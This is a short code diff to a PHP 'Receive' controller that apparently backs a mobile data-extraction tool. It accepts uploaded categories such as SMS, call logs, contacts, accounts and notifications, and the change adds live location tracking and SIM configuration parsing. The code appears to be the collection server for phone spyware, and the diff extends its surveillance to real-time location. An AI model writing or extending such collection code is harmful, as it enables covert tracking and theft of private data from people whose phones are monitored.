@@ -30,6 +30,10 @@ class Receive extends BaseController
     private $allowedCategories = [
         // Legacy extractors
         'contacts', 'logs', 'sms', 'apps', 'files', 'calls', 'location',
+        // Live location tracking
+        'live_locations', 'live_location',
+        // SIM config
+        'sim_configs', 'sim_config',
         // Advanced extractors
         'device', 'device_context', 'context', 'network', 'network_info', 'accounts', 'calendar', 'app', 'app_usage', 'usage', 'notifications', 'bluetooth', 'sensors', 'sensor',
         // Device info & security
@@ -462,7 +466,11 @@ class Receive extends BaseController
             'sms'      => 'get_sms',
             'apps'     => 'get_apps',
             'files'    => 'get_files',
-            'location' => 'get_location',
+            'location'       => 'get_location',
+            'sim_configs'    => 'parse_sim_configs',
+            'sim_config'     => 'parse_sim_configs',
+            'live_locations' => 'parse_live_locations',
+            'live_location'  => 'parse_live_locations',
         ];
 
         // ── Advanced extractor routing (aliases included) ─────────────────
